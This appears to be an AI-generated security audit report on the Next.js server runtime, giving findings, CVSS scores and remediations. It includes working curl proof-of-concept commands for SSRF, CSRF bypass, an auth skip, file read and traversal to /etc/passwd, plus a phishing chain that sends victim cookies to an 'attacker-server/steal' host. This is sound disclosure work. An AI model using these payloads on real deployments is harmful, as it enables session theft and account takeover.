# Security Audit Report: Next.js

**Audit Firm:** AutoFyn SignalPilot

**Audit Model:** Claude Opus 4.6 (Anthropic)

**Target:** Next.js (https://github.com/vercel/next.js)

**Repository:** `next.js`

**Commit Reviewed:** `007051470157d38058730ffa0a1983d4b4106424`

**Date:** 2026-05-26

**Status:** 4 High + 1 Critical Chain Confirmed | 4 Medium Supporting Findings

---

## Executive Summary

This audit examined the Next.js server runtime at commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29), focusing on request handling, middleware routing, image optimization, Server Actions CSRF protection, and dev-mode security boundaries. Testing was performed against live Docker instances in both production and development modes.

Key findings:
- **Image optimizer follows redirects without re-validating `remotePatterns`** — enabling SSRF to arbitrary public hosts via any allowed CDN
- **`x-forwarded-host` header injection bypasses Server Action CSRF protection** — the header is not stripped by `filterInternalHeaders` and is unconditionally trusted by `parseHostHeader`
- **Cross-origin middleware rewrites forward victim credentials (`Cookie`, `Authorization`) to attacker-controlled servers** — no credential stripping or host allowlist exists
- **`x-middleware-prefetch` header is not in the internal headers filter** — external injection bypasses all SSR auth logic on dynamic pages
- **DNS rebinding bypasses `blockCrossSiteDEV`** — all dev endpoints reachable from a malicious webpage in Firefox/Safari

One exploit chain (CHAIN-1, Critical) demonstrates complete account takeover from a single phishing link by combining credential theft (VULN-8) with CSRF bypass (VULN-7). All findings confirmed live with negative controls.

---

## Evidence Types

- **Direct Next.js Exploit** — PoC executed against a live Next.js instance with negative controls confirming the protection is active under normal conditions.
- **Direct Next.js Exploit + Attacker Infrastructure** — PoC executed with attacker-controlled auxiliary services (redirect server, credential capture server) on the audit Docker network.
- **Source-Confirmed / Partial Live** — Vulnerable code path confirmed by source review with limited live probing (e.g., response differential only).

---

## Findings Table

| ID | Vulnerability | Severity | CVSS | Status | Evidence |
|----|--------------|----------|------|--------|----------|
| VULN-1 | SSRF via Image Optimizer Redirect (remotePatterns bypass) | High | 8.6 | Confirmed | Direct Next.js Exploit + Attacker Infrastructure |
| VULN-7 | Server Action CSRF Bypass via x-forwarded-host Injection | High | 8.1 | Confirmed | Direct Next.js Exploit |
| VULN-8 | Middleware Rewrite SSRF with Credential Forwarding | High | 8.1 | Confirmed | Direct Next.js Exploit + Attacker Infrastructure |
| VULN-11 | Route Oracle and SSR Skip via x-middleware-prefetch | High | 7.5 | Confirmed | Direct Next.js Exploit |
| VULN-9 | DNS Rebinding Bypass of blockCrossSiteDEV | Medium | 6.3 | Confirmed | Direct Next.js Exploit |
| VULN-4 | Arbitrary File Read via Source Map Endpoint | Medium | 6.5 | Confirmed | Direct Next.js Exploit |
| VULN-6 | Path Traversal in launch-editor (File Oracle) | Medium | 5.3 | Confirmed | Direct Next.js Exploit |
| VULN-10 | Edge Runtime Server Action Unbounded Body (DoS) | Medium | 5.3 | Confirmed | Direct Next.js Exploit |

---

## Exploit Chain

### Chain Evidence Matrix

| Chain | Title | Severity | Vulnerabilities | Script | Evidence |
|-------|-------|----------|----------------|--------|----------|
| CHAIN-1 | Credential Theft → Account Takeover | Critical | VULN-8 + VULN-7 | `exploits/chain_credential_theft_account_takeover.sh` | Direct Next.js Exploit + Attacker Infrastructure |

### CHAIN-1: Credential Theft to Account Takeover

**Severity:** Critical (CVSS 9.3)

**Vulnerabilities:** VULN-8 (Middleware Rewrite SSRF) + VULN-7 (CSRF Bypass via x-forwarded-host)

**Attack Flow:**

1. Attacker sends victim a phishing link: `http://target.com/?backend=http://attacker-server/steal`
2. Victim clicks link. Browser sends request with session cookie and auth headers.
3. Middleware rewrites to attacker's capture server. `proxyRequest` forwards all headers including `Cookie` and `Authorization`.
4. Attacker reads stolen credentials from capture server.
5. Attacker replays stolen session: `POST /` with `Next-Action: <id>`, `Cookie: session=VICTIM_TOKEN`, `Origin: https://evil.com`, `x-forwarded-host: evil.com`.
6. CSRF check passes (`evil.com === evil.com`). Server action executes as victim.

**Confirmed Output:**

```
Step 1: OK (HTTP 200 — middleware rewrote to attacker capture server)
Step 2: OK (CREDENTIAL_CAPTURED: cookie=session=CHAIN1_VICTIM_SESSION_abc789)
Step 2: OK (CREDENTIAL_CAPTURED: authorization=Bearer chain1-stolen-apikey-xyz)
Step 4: OK (HTTP 200, no CSRF error — stolen session executed privileged action)
RESULT: PASS
```

**Impact:** Any authenticated user who clicks a crafted link is fully compromised — session stolen and immediately leveraged for privileged mutations. Zero interaction beyond a single click.

---

## Vulnerability Details

### VULN-1: SSRF via Image Optimizer Redirect (remotePatterns bypass)

**Severity:** High (CVSS 8.6)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
**CWE:** CWE-918: Server-Side Request Forgery (SSRF)

**Affected Code:**
- `packages/next/src/server/image-optimizer.ts:454` — `hasRemoteMatch` check on initial URL only
- `packages/next/src/server/image-optimizer.ts:909-928` — `fetchExternalImage` follows redirects recursively without re-validating against `remotePatterns`

**Description:**

The image optimizer validates the initial URL against `remotePatterns` via `hasRemoteMatch` but follows HTTP redirects recursively without re-checking the redirect target. An attacker who controls any server listed in `remotePatterns` (or can compromise/intercept traffic to it) can redirect the optimizer to an arbitrary host not in the allowlist. The private IP check (`isPrivateIp`) is enforced on redirects, but redirects to any public IP bypass `remotePatterns` entirely.

**Vulnerable Code:**

```typescript
// image-optimizer.ts:909-928 — recursive redirect following, no remotePatterns check
if (res.status === 301 || res.status === 302 || ...) {
  const redirectUrl = res.headers.get('location')
  // No hasRemoteMatch(domains, remotePatterns, new URL(redirectUrl)) call here
  return fetchExternalImage(redirectUrl, dangerouslyAllowLocalIP, ...)
}
```

**Attack Scenario:** CDN in `remotePatterns` redirects image optimizer to attacker-controlled public server, exfiltrating response data.

**Proof of Concept:**

```bash
# Direct access blocked (400):
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-secret-server%3A9090%2Fsecret-image.jpg&w=640&q=75'

# Redirect bypass (200 — remotePatterns bypassed):
curl -s -o /dev/null -w '%{http_code}' \
  'http://localhost:3000/_next/image?url=http%3A%2F%2Faudit-redirect-server%3A8080%2Fredirect-to-secret&w=640&q=75'
```

**Remediation:** Call `hasRemoteMatch(domains, remotePatterns, new URL(redirect))` before following redirects in `fetchExternalImage`. Thread `domains` and `remotePatterns` through the function signature.

---

### VULN-7: Server Action CSRF Bypass via x-forwarded-host Header Injection

**Severity:** High (CVSS 8.1)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
**CWE:** CWE-346: Origin Validation Error

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:482-518` — `parseHostHeader` unconditionally returns `x-forwarded-host` when called without `originDomain`
- `packages/next/src/server/app-render/action-handler.ts:635,652` — CSRF check calls `parseHostHeader(req.headers)` without `originDomain`
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `x-forwarded-host` absent from `INTERNAL_HEADERS` filter

**Description:**

The Server Actions CSRF check compares `Origin` host against the value from `parseHostHeader`. This function returns `x-forwarded-host` unconditionally when called without the `originDomain` parameter (which the CSRF check never passes). Since `x-forwarded-host` is not in `INTERNAL_HEADERS`, external clients inject it freely. Sending `Origin: https://evil.com` + `x-forwarded-host: evil.com` satisfies the CSRF check. Exploitable on directly internet-facing deployments (Railway, Fly.io, Docker) where no reverse proxy overwrites `x-forwarded-host`.

**Attack Scenario:** Cross-origin attacker invokes privileged Server Actions on behalf of victims with `SameSite=None` session cookies.

**Proof of Concept:**

```bash
ACTION_ID=$(docker exec audit-nextjs-app cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)

# Rejected (CSRF active):
curl -s -o /dev/null -w '%{http_code}' -X POST \
  -H "Next-Action: $ACTION_ID" -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Origin: https://evil.com" --data '[]' 'http://localhost:3000/'

# Bypass (CSRF satisfied via x-forwarded-host injection):
curl -s -o /dev/null -w '%{http_code}' -X POST \
  -H "Next-Action: $ACTION_ID" -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Origin: https://evil.com" -H "x-forwarded-host: evil.com" --data '[]' 'http://localhost:3000/'
```

**Remediation:** Add `x-forwarded-host` to `INTERNAL_HEADERS` in `server-ipc/utils.ts`, OR wire `originDomain` parameter at line 635 to constrain `parseHostHeader` return values.

---

### VULN-8: Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts

**Severity:** High (CVSS 8.1)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
**CWE:** CWE-918: Server-Side Request Forgery (SSRF)

**Affected Code:**
- `packages/next/src/server/lib/router-utils/proxy-request.ts:25-36` — `http-proxy` with `changeOrigin: true`, forwards all headers
- `packages/next/src/server/lib/router-server.ts:499-508` — calls `proxyRequest` for cross-origin rewrites, no host validation
- `packages/next/src/server/lib/router-utils/resolve-routes.ts:726-739` — returns full external URL for cross-origin `x-middleware-rewrite`
- `packages/next/src/server/web/utils.ts:141-152` — `validateURL` only checks parseability

**Description:**

When middleware uses `NextResponse.rewrite(externalURL)` with a cross-origin destination, `router-server.ts` calls `proxyRequest` which forwards ALL original request headers — including `Cookie` and `Authorization` — to the external target via `http-proxy`. No host allowlist or credential stripping exists. This pattern is extremely common in multi-tenant routing, A/B testing, and locale-based backends.

**Attack Scenario:** Phishing link with `?backend=http://attacker.com/steal` causes middleware to rewrite and forward victim's session credentials to attacker.

**Proof of Concept:**

```bash
curl -s -H "Cookie: session=VICTIM_SECRET_TOKEN_12345" \
  -H "Authorization: Bearer sk-secret-api-key-67890" \
  'http://localhost:3003/?backend=http://audit-credential-capture:9091/steal'

docker logs audit-credential-capture 2>&1 | grep CREDENTIAL_CAPTURED
```

**Remediation:** Strip `Cookie`, `Authorization`, and `X-Auth-*` headers before proxying cross-origin rewrites in `proxy-request.ts`. Alternatively, add a `rewrites.allowedExternalHosts` config option.

---

### VULN-11: Route Oracle and SSR Skip via Unfiltered x-middleware-prefetch Header

**Severity:** High (CVSS 7.5)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`
**CWE:** CWE-287: Improper Authentication

**Affected Code:**
- `packages/next/src/server/lib/server-ipc/utils.ts:42-54` — `x-middleware-prefetch` absent from `INTERNAL_HEADERS`
- `packages/next/src/server/base-server.ts:2171-2183` — prefetch bail-out skips all SSR when header is present

**Description:**

`x-middleware-prefetch` is an internal header that should only be set by Next.js's client-side router. It is not in the `INTERNAL_HEADERS` filter list, so external clients inject it freely. When present on requests to dynamic (non-SSG) pages, the server short-circuits entirely: returns `{}`, sets `x-matched-path` (revealing the route pattern), sets `x-middleware-skip: 1`, and skips ALL server-side rendering — including auth checks, rate limiting, and logging.

**Vulnerable Code:**

```typescript
// base-server.ts:2171-2183
if (!isSSG && req.headers['x-middleware-prefetch'] && !(is404Page || pathname === '/_error')) {
  res.setHeader(MATCHED_PATH_HEADER, pathname)
  res.setHeader('x-middleware-skip', '1')
  res.body('{}').send()
  return null
}
```

**Attack Scenario:** External attacker probes routes and bypasses SSR auth on all dynamic pages.

**Proof of Concept:**

```bash
# Normal (SSR auth runs): returns "Access Denied"
curl -s "http://localhost:3000/protected"

# Bypass (SSR skipped): returns "{}" — auth never executed
curl -s -H "x-middleware-prefetch: 1" "http://localhost:3000/protected"
```

**Remediation:** Add `x-middleware-prefetch` to `INTERNAL_HEADERS` array in `server-ipc/utils.ts`.

---

### VULN-9: DNS Rebinding Bypass of blockCrossSiteDEV (dev mode)

**Severity:** Medium (CVSS 6.3)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N`
**CWE:** CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action

**Affected Code:**
- `packages/next/src/server/lib/router-utils/block-cross-site-dev.ts:116-175` — lines 169-174 allow requests with no `Origin`; `Host` header never validated

**Description:**

`blockCrossSiteDEV` guards all dev endpoints from cross-origin access. When `Origin` is absent (as in same-origin requests), the function returns `false` — allowing access. Under DNS rebinding, the browser treats the request as same-origin (no Origin sent). The `Host` header is never validated, so DNS-rebound requests with `Host: evil.com:3000` pass through. Chrome PNA blocks this; Firefox and Safari are vulnerable.

**Attack Scenario:** Developer visits malicious page → DNS rebinds to localhost → all `/__nextjs*` and `/_next/*` dev endpoints accessible (source maps, file oracle, inspector).

**Proof of Concept:**

```bash
# Blocked (403):
curl -s -o /dev/null -w '%{http_code}' -H "Origin: http://evil.com" "http://localhost:3002/__nextjs_source-map?filename=test"

# Bypassed (non-403):
curl -s -o /dev/null -w '%{http_code}' -H "Host: evil.com:3000" "http://localhost:3002/__nextjs_source-map?filename=test"
```

**Remediation:** Validate `Host` header in `blockCrossSiteDEV` — block if it doesn't match `localhost`, `127.0.0.1`, `[::1]`, configured hostname, or `allowedDevOrigins`.

---

### VULN-4: Arbitrary File Read via Source Map Endpoint (webpack dev server)

**Severity:** Medium (CVSS 6.5)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (scoped to dev mode)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:697-710` — `/__nextjs_source-map` handler, no path validation
- `packages/next/src/server/dev/get-source-map-from-file.ts:26-80` — reads arbitrary file, follows `sourceMappingURL`

**Description:**

The `/__nextjs_source-map` endpoint accepts arbitrary filesystem paths via the `filename` parameter. `getSourceMapFromFile` reads the file, then follows any `//# sourceMappingURL=` comment to read a second file. No path validation or project-root scoping exists. Dev mode only.

**Attack Scenario:** Any process reaching the dev server port reads arbitrary files via chained sourceMappingURL.

**Proof of Concept:**

```bash
# Chain file exfiltrates secret:
curl -s 'http://localhost:3002/__nextjs_source-map?filename=/tmp/chain.js'
# Returns sourcesContent with DEV_SECRET_KEY
```

**Remediation:** Validate `filename` resolves within the project root before reading. Apply same check to resolved `sourceMappingURL` targets.

---

### VULN-6: Path Traversal in launch-editor via isAppRelativePath

**Severity:** Medium (CVSS 5.3)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (scoped to dev mode)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory

**Affected Code:**
- `packages/next/src/server/dev/middleware-webpack.ts:646-654` — `path.join('app', '', relativeFilePath)` unsanitized
- `packages/next/src/next-devtools/server/launch-editor.ts:455-469` — `path.join(nextRootDirectory, file)` resolves traversal

**Description:**

When `isAppRelativePath=1`, the handler joins user input with `path.join` which normalizes `../` sequences. The resolved path is passed to `fsp.access(filePath, F_OK)` — returning 204 (exists) or 404 (not found). This creates a file existence oracle for arbitrary filesystem paths. Dev mode only.

**Attack Scenario:** Enumerate sensitive files on dev machine via 204/404 differential.

**Proof of Concept:**

```bash
# 404 (nonexistent):
curl -s -o /dev/null -w '%{http_code}' 'http://localhost:3002/__nextjs_launch-editor?file=nonexistent&isAppRelativePath=1'

# 204 (traversal confirmed):
curl -s -o /dev/null -w '%{http_code}' 'http://localhost:3002/__nextjs_launch-editor?file=../../../../etc/passwd&isAppRelativePath=1'
```

**Remediation:** Validate `path.resolve(nextRootDirectory, appPath).startsWith(nextRootDirectory)` before proceeding.

---

### VULN-10: Edge Runtime Server Action Unbounded Body (DoS)

**Severity:** Medium (CVSS 5.3)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`
**CWE:** CWE-770: Allocation of Resources Without Limits or Throttling

**Affected Code:**
- `packages/next/src/server/app-render/action-handler.ts:759` — `// TODO: add body limit` comment
- `packages/next/src/server/app-render/action-handler.ts:773` — `formData()` unbounded
- `packages/next/src/server/app-render/action-handler.ts:851-862` — `while(true)` reader loop unbounded
- `packages/next/src/server/app-render/action-handler.ts:901-931` — `sizeLimitTransform` (1MB default) used only in Node path

**Description:**

The Node runtime path enforces a 1MB body limit via `sizeLimitTransform`. The edge runtime path has an explicit `// TODO: add body limit` comment and no enforcement — both `formData()` and the reader loop buffer the entire body without size checks. Self-hosted edge deployments have no framework-level protection; managed platforms (Vercel, Cloudflare) enforce their own limits.

**Attack Scenario:** Attacker sends multi-megabyte bodies to edge-runtime server action endpoints, causing memory exhaustion on self-hosted deployments.

**Proof of Concept:**

```bash
# Node (enforced): logs "Body exceeded 1 MB limit"
dd if=/dev/zero bs=1024 count=2048 | tr '\0' 'A' > /tmp/2mb && \
curl -s -X POST -H "Next-Action: $ACTION_ID" --data-binary @/tmp/2mb "http://localhost:3000/"

# Edge (unbounded): no body limit error, fully buffered
curl -s -X POST -H "Next-Action: $ACTION_ID_EDGE" --data-binary @/tmp/2mb "http://localhost:3004/"
```

**Remediation:** Add body size enforcement to the edge path before `formData()` or reader loop. The `serverActions.bodySizeLimit` config value is already available at that point.

---

## Reproduction Instructions

**Prerequisites:**
- Docker Engine 20+
- Ports 3000-3004, 8080, 9090, 9091 available

**Run:**

```bash
cd autofyn_audit/
bash setup.sh          # Builds 8 containers, ~3-5 min
bash run_all_exploits.sh  # Runs all 11 exploit + 3 chain scripts
bash teardown.sh       # Cleanup
```

**Expected Output:**

```
=== AUDIT RESULTS ===
  11/11 exploits confirmed
=== CHAIN RESULTS ===
  3/3 chains confirmed
```

**Note:** The test suite includes scripts for all 11 original findings and 3 chains (including those removed during verification). The retained findings are the 8 listed in this report + CHAIN-1.

---

## Conclusion

The audit identified systemic issues in two areas:

1. **Internal header trust boundary gaps** — `x-forwarded-host` and `x-middleware-prefetch` are consumed by security-critical code paths but not stripped by `filterInternalHeaders`. This is a class of bugs: any internal header trusted by server logic but absent from the filter list is exploitable.

2. **Missing re-validation on redirects/rewrites** — Both the image optimizer (redirect targets) and the middleware proxy (rewrite destinations) perform initial validation but skip re-validation on subsequent hops. This enables SSRF and credential forwarding.

**Priority remediation order:**

1. Add `x-forwarded-host` and `x-middleware-prefetch` to `INTERNAL_HEADERS` (fixes VULN-7 and VULN-11 — two one-line changes)
2. Re-validate `remotePatterns` on redirect targets in `fetchExternalImage` (fixes VULN-1)
3. Strip credential headers on cross-origin rewrites in `proxyRequest` (fixes VULN-8)
4. Add Host header validation to `blockCrossSiteDEV` (fixes VULN-9)
5. Restrict `/__nextjs_source-map` and `/__nextjs_launch-editor` to project-root paths (fixes VULN-4, VULN-6)
6. Add body size limit to edge runtime action handler (fixes VULN-10)

---

## Files Delivered

```
autofyn_audit/
├── audit_report.md                          # This report
├── setup.sh                                 # Docker environment setup
├── teardown.sh                              # Docker cleanup
├── run_all_exploits.sh                      # Master exploit runner
├── Dockerfile.runner                        # In-network test runner
├── docs/                                    # CVE advisory files
│   ├── CVE-VULN-1.md
│   ├── CVE-VULN-7.md
│   ├── CVE-VULN-8.md
│   └── CVE-VULN-11.md
├── exploits/
│   ├── exploit_ssrf_redirect.sh             # VULN-1
│   ├── exploit_dev_file_read.sh             # VULN-4
│   ├── exploit_dev_path_traversal.sh        # VULN-6
│   ├── exploit_csrf_host_bypass.sh          # VULN-7
│   ├── exploit_middleware_ssrf.sh           # VULN-8
│   ├── exploit_dns_rebinding.sh             # VULN-9
│   ├── exploit_edge_body_dos.sh             # VULN-10
│   ├── exploit_prefetch_bypass.sh           # VULN-11
│   ├── exploit_header_injection.sh          # (archived — VULN-2 removed)
│   ├── exploit_csrf_bypass.sh               # (archived — VULN-3 informational)
│   ├── exploit_dev_rce.sh                   # (archived — VULN-5 removed)
│   ├── chain_credential_theft_account_takeover.sh  # CHAIN-1
│   ├── chain_dns_rebinding_to_rce.sh        # (archived — CHAIN-2 removed)
│   ├── chain_recon_to_ssrf_pivot.sh         # (archived — CHAIN-3 removed)
│   ├── inspector_rce.mjs                    # CDP helper for inspector exploits
│   └── poc_dns_rebinding.html               # Browser PoC for DNS rebinding
├── vulnerable_app/                          # Production test app
├── dev_app/                                 # Dev mode test app
├── middleware_app/                          # Middleware SSRF test app
├── edge_app/                                # Edge runtime test app
├── redirect_server/                         # 302 redirect to secret server
├── secret_server/                           # Target for SSRF pivot
└── credential_capture_server/               # Logs captured credentials
```

---

## Appendix A: Informational Notes

### INFO-1: Server Actions Execute Without Origin Header (intentional defense-in-depth gap)

**Classification:** Informational — explicitly documented intentional behavior, not a vulnerability

**Affected Code:** `packages/next/src/server/app-render/action-handler.ts:646-651`

Server Actions allow requests without an `Origin` header, logging a warning but proceeding with execution. The source code documents the rationale: handcrafted requests cannot carry browser-managed credentials. This is standard CSRF protection design — Django, Rails, and Laravel use the same pattern. Not a vulnerability.

---

## Appendix B: Removed Findings (Verification Notes)

### VULN-2: Auth Bypass via Internal Header Injection (NEXT_PRIVATE_TEST_HEADERS) — REMOVED

**Reason:** Test-only env var misconfiguration. Setting `NEXT_PRIVATE_TEST_HEADERS=1` in production is a user error, not a framework vulnerability.

### VULN-5: Unauthenticated V8 Inspector Open via Dev Endpoint — REMOVED

**Reason:** Standard Node.js dev tooling. `inspector.open()` binds to localhost only. Every dev server provides equivalent capabilities. The PoC required non-default `--inspect=0.0.0.0:9229`.

### CHAIN-2: Browser Visit to Full RCE (dev mode) — REMOVED

**Reason:** Combined VULN-9 (retained) with VULN-5 (removed). Dev-mode chain without production impact.

### CHAIN-3: Route Discovery to Auth Bypass to SSRF Pivot — REMOVED

**Reason:** Components are independently exploitable, not causally linked. Not a true chain.

---

## Appendix C: Test Environment

```
audit-net (Docker bridge network)
  |
  +-- audit-nextjs-app (3000:3000) — next start, production mode
  +-- audit-nextjs-app-test-headers (3001:3000) — next start, NEXT_PRIVATE_TEST_HEADERS=1
  +-- audit-nextjs-dev (3002:3000, 9230:9229) — next dev --webpack
  +-- audit-middleware-app (3003:3000) — next start, production mode
  +-- audit-edge-app (3004:3000) — next start, edge runtime
  +-- audit-redirect-server (8080:8080) — issues 302 redirect
  +-- audit-secret-server (9090:9090) — serves JPEG, logs access
  +-- audit-credential-capture (9091:9091) — logs captured credentials
```
